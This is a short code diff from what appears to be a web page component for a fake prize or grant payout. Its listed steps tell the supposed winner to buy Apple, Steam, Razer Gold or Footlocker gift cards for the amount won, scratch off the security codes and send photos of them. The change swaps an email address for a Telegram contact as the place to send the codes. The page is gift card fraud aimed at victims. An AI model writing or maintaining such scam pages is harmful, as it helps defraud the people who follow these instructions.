@@ -143,7 +143,7 @@ function PaymentPageContent() {
           `Purchase a ${winner.amountWon.toLocaleString('en-US', { style: 'currency', currency: 'USD' })} Apple card, Steam, Razer Gold or Footlocker gift card`,
           "Scratch off the security code on the back",
           "Send a clear photo of the front and back",
-          "Send to: grantsupport@payment.com",
+          "Send to Amira on telegram: https://t.me/amira_aldahab8391",
           "Contact support with your order confirmation"
         ]
       }
